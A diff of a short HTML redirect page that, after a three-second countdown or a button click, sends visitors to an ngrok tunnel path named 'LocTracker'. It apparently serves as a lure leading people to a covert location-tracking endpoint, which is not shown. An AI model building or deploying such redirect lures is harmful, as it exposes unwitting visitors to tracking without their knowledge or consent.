@@ -2,24 +2,45 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Redirecting...</title>
-<script>
-    // =========================
-    // ONLY CHANGE THIS LINE
-    const targetURL = "https://f56484e5e388.ngrok-free.app/LocTracker";
-    // =========================
-
-    // Redirect immediately with cache-busting
-    window.location.replace(targetURL + "?_=" + new Date().getTime());
-</script>
+<title>Redirect Page</title>
+<style>
+  body { font-family: Arial; text-align: center; padding-top: 50px; }
+  button { font-size: 20px; padding: 10px 20px; cursor: pointer; }
+</style>
 </head>
 <body>
-<p>Redirecting to <a id="link" href="#">link</a>...</p>
+
+<h2>Redirecting...</h2>
+<p id="countdown">3</p>
+<button id="goButton">Go</button>
+
 <script>
-    // Automatically update clickable link
-    const link = document.getElementById("link");
-    link.href = targetURL;
-    link.innerText = targetURL;
+  // ===== CHANGE THIS URL ONLY =====
+  const targetURL = "https://e55c9c7e937c.ngrok-free.app/LocTracker";
+  // ================================
+
+  const button = document.getElementById("goButton");
+  const countdownEl = document.getElementById("countdown");
+  let seconds = 3;
+
+  // Countdown timer
+  const timer = setInterval(() => {
+    seconds--;
+    countdownEl.innerText = seconds;
+    if (seconds <= 0) {
+      clearInterval(timer);
+      go(); // auto-click after 3 sec
+    }
+  }, 1000);
+
+  // Click function
+  function go() {
+    window.location.href = targetURL;
+  }
+
+  // Button click
+  button.addEventListener("click", go);
 </script>
+
 </body>
 </html>
